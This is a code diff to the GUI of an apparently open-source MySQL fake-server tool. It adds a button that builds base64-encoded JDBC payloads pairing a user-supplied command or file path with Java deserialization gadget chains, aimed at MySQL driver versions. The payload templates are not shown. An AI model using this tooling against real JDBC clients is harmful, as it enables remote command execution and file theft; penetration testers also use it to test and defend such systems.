@@ -21,6 +21,7 @@ import java.io.IOException;
 import java.io.InputStream;
 import java.net.Socket;
 import java.net.URI;
+import java.util.Base64;
 
 public class FakeServer {
     private JPanel masterPanel;
@@ -70,6 +71,7 @@ public class FakeServer {
     private JPanel jdbcVersionPanel;
     private JButton stopServerButton;
     private JPanel opPanel;
+    private JButton generateBase64Button;
 
     public static void start() {
         JFrame frame = new JFrame(Constant.FakeServer);
@@ -326,6 +328,99 @@ public class FakeServer {
             this.generateText.setText(poc);
             this.generateText.setCaretPosition(0);
         });
+        this.generateBase64Button.addActionListener(e -> {
+            if (fileReadButton.isSelected()) {
+                String filename = cmdFileText.getText();
+                if (StringUtil.isNull(filename)) {
+                    TipUtil.error("filename is null");
+                    return;
+                }
+                filename = "fileread_" + filename;
+                filename = "base64" + Base64.getEncoder().encodeToString(filename.getBytes());
+                String addr = addrText.getText();
+                if (StringUtil.isNull(addr)) {
+                    TipUtil.error("addr is null");
+                    return;
+                }
+                String poc;
+                if (v8078020RadioButton.isSelected()) {
+                    poc = String.format(Constant.MySQLReadFile8Temp, addr, filename);
+                } else {
+                    poc = String.format(Constant.MySQLReadFile56Temp, addr, filename);
+                }
+                this.generateText.setText(poc);
+                this.generateText.setCaretPosition(0);
+                return;
+            }
+            String gadget;
+            if (cbButton.isSelected()) {
+                gadget = "deser_CB";
+            } else if (cc31Button.isSelected()) {
+                gadget = "deser_CC31";
+            } else if (cc44Button.isSelected()) {
+                gadget = "deser_CC44";
+            } else if (romeButton.isSelected()) {
+                gadget = "deser_ROME";
+            } else if (jdk7Button.isSelected()) {
+                gadget = "deser_JDK7U21";
+            } else if (jdk8Button.isSelected()) {
+                gadget = "deser_JDK8U20";
+            } else if (c3p0Button.isSelected()) {
+                gadget = "deser_C3P0";
+            } else if (urldnsButton.isSelected()) {
+                gadget = "deser_URLDNS";
+            } else {
+                TipUtil.error("gadget is null");
+                return;
+            }
+            String addr = addrText.getText();
+            if (StringUtil.isNull(addr)) {
+                TipUtil.error("addr is null");
+                return;
+            }
+            String cmd = cmdFileText.getText();
+            if (StringUtil.isNull(cmd)) {
+                TipUtil.error("cmd is null");
+                return;
+            }
+            gadget = gadget + "_" + cmd.trim();
+            gadget = "base64" + Base64.getEncoder().encodeToString(gadget.getBytes());
+            String temp = null;
+            if (serverStatusDiffInterceptorRadioButton.isSelected()) {
+                if (v5105118RadioButton.isSelected() ||
+                        v51195128RadioButton.isSelected() ||
+                        v51295148RadioButton.isSelected()) {
+                    temp = Constant.MySQL510T5XSTemp;
+                } else if (v602606RadioButton.isSelected()) {
+                    temp = Constant.MySQL6XSTemp;
+                } else if (v8078020RadioButton.isSelected()) {
+                    temp = Constant.MySQLT8020STemp;
+                }
+            } else if (detectCustomCollationsRadioButton.isSelected()) {
+                if (v5105118RadioButton.isSelected()) {
+                    TipUtil.error("only support serverStatusDiffInterceptor");
+                    return;
+                } else if (v51195128RadioButton.isSelected()) {
+                    temp = Constant.MySQL5119T5128DTemp;
+                } else if (v51295148RadioButton.isSelected()) {
+                    temp = Constant.MySQL5129T5148DTemp;
+                } else if (v602606RadioButton.isSelected()) {
+                    temp = Constant.MySQL6XDTemp;
+                } else if (v8078020RadioButton.isSelected()) {
+                    TipUtil.error("only support serverStatusDiffInterceptor");
+                    return;
+                }
+            } else {
+                TipUtil.error("type is null");
+                return;
+            }
+            if (temp == null) {
+                return;
+            }
+            String poc = String.format(temp, addr, gadget);
+            this.generateText.setText(poc);
+            this.generateText.setCaretPosition(0);
+        });
         this.copyButton.addActionListener(e -> {
             String poc = generateText.getText();
             if (StringUtil.isNull(poc)) {
@@ -369,11 +464,11 @@ public class FakeServer {
 
                         if (!ver.equals(Version.version)) {
                             String output;
-                                output = String.format("New Version!\n%s: %s\n%s: %s\n%s",
-                                        "Your Current Version", Version.version,
-                                        "Latest Version", ver,
-                                        "https://github.com/4ra1n/mysql-fake-server/releases/latest");
-                                JOptionPane.showMessageDialog(masterPanel, output);
+                            output = String.format("New Version!\n%s: %s\n%s: %s\n%s",
+                                    "Your Current Version", Version.version,
+                                    "Latest Version", ver,
+                                    "https://github.com/4ra1n/mysql-fake-server/releases/latest");
+                            JOptionPane.showMessageDialog(masterPanel, output);
                         }
                     } catch (Exception ignored) {
                     }
@@ -457,7 +552,7 @@ public class FakeServer {
         logArea.setForeground(new Color(-11206882));
         logStroll.setViewportView(logArea);
         payloadPanel = new JPanel();
-        payloadPanel.setLayout(new GridLayoutManager(10, 16, new Insets(0, 0, 0, 0), -1, -1));
+        payloadPanel.setLayout(new GridLayoutManager(10, 17, new Insets(0, 0, 0, 0), -1, -1));
         payloadPanel.setBackground(new Color(-1120293));
         masterPanel.add(payloadPanel, new GridConstraints(1, 0, 1, 2, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_BOTH, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, null, null, null, 0, false));
         payloadPanel.setBorder(BorderFactory.createTitledBorder(null, "Payload Panel", TitledBorder.DEFAULT_JUSTIFICATION, TitledBorder.DEFAULT_POSITION, null, null));
@@ -471,10 +566,10 @@ public class FakeServer {
         payloadPanel.add(addrLabel, new GridConstraints(0, 0, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 1, false));
         addrText = new JTextField();
         addrText.setText("");
-        payloadPanel.add(addrText, new GridConstraints(0, 3, 1, 13, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_WANT_GROW, GridConstraints.SIZEPOLICY_FIXED, null, new Dimension(150, -1), null, 0, false));
+        payloadPanel.add(addrText, new GridConstraints(0, 3, 1, 14, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_WANT_GROW, GridConstraints.SIZEPOLICY_FIXED, null, new Dimension(150, -1), null, 0, false));
         copyButton = new JButton();
-        copyButton.setText("Copy");
-        payloadPanel.add(copyButton, new GridConstraints(9, 14, 1, 2, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
+        copyButton.setText("Copy Payload");
+        payloadPanel.add(copyButton, new GridConstraints(9, 14, 1, 3, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
         cmdFileLabel = new JLabel();
         cmdFileLabel.setText("Cmd / File");
         payloadPanel.add(cmdFileLabel, new GridConstraints(8, 0, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 1, false));
@@ -482,8 +577,8 @@ public class FakeServer {
         cmdFileText.setText("");
         payloadPanel.add(cmdFileText, new GridConstraints(8, 3, 1, 11, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_WANT_GROW, GridConstraints.SIZEPOLICY_FIXED, null, new Dimension(150, -1), null, 0, false));
         generatePayloadButton = new JButton();
-        generatePayloadButton.setText("Generate Payload");
-        payloadPanel.add(generatePayloadButton, new GridConstraints(8, 14, 1, 2, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
+        generatePayloadButton.setText("Generate Normal");
+        payloadPanel.add(generatePayloadButton, new GridConstraints(8, 15, 1, 2, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
         modeLabel = new JLabel();
         modeLabel.setText("Mode");
         payloadPanel.add(modeLabel, new GridConstraints(3, 0, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 1, false));
@@ -498,7 +593,7 @@ public class FakeServer {
         gadgetPanel = new JPanel();
         gadgetPanel.setLayout(new GridLayoutManager(2, 4, new Insets(0, 0, 0, 0), -1, -1));
         gadgetPanel.setBackground(new Color(-1120293));
-        payloadPanel.add(gadgetPanel, new GridConstraints(1, 0, 2, 16, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_BOTH, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, null, null, null, 0, false));
+        payloadPanel.add(gadgetPanel, new GridConstraints(1, 0, 2, 17, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_BOTH, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, null, null, null, 0, false));
         gadgetPanel.setBorder(BorderFactory.createTitledBorder(null, "Gadget", TitledBorder.DEFAULT_JUSTIFICATION, TitledBorder.DEFAULT_POSITION, null, null));
         jdk7Button = new JRadioButton();
         jdk7Button.setBackground(new Color(-1120293));
@@ -546,7 +641,7 @@ public class FakeServer {
         jdbcVersionPanel = new JPanel();
         jdbcVersionPanel.setLayout(new GridLayoutManager(1, 5, new Insets(0, 0, 0, 0), -1, -1));
         jdbcVersionPanel.setBackground(new Color(-1120293));
-        payloadPanel.add(jdbcVersionPanel, new GridConstraints(5, 0, 3, 16, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_BOTH, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, null, null, null, 0, false));
+        payloadPanel.add(jdbcVersionPanel, new GridConstraints(5, 0, 3, 17, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_BOTH, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, null, null, null, 0, false));
         jdbcVersionPanel.setBorder(BorderFactory.createTitledBorder(null, "JDBC Version", TitledBorder.DEFAULT_JUSTIFICATION, TitledBorder.DEFAULT_POSITION, null, null));
         v5105118RadioButton = new JRadioButton();
         v5105118RadioButton.setBackground(new Color(-1120293));
@@ -568,6 +663,9 @@ public class FakeServer {
         v51295148RadioButton.setBackground(new Color(-1120293));
         v51295148RadioButton.setText("5.1.29-5.1.48");
         jdbcVersionPanel.add(v51295148RadioButton, new GridConstraints(0, 2, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
+        generateBase64Button = new JButton();
+        generateBase64Button.setText("Generate Base64");
+        payloadPanel.add(generateBase64Button, new GridConstraints(8, 14, 1, 1, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
         ButtonGroup buttonGroup;
         buttonGroup = new ButtonGroup();
         buttonGroup.add(deserButton);
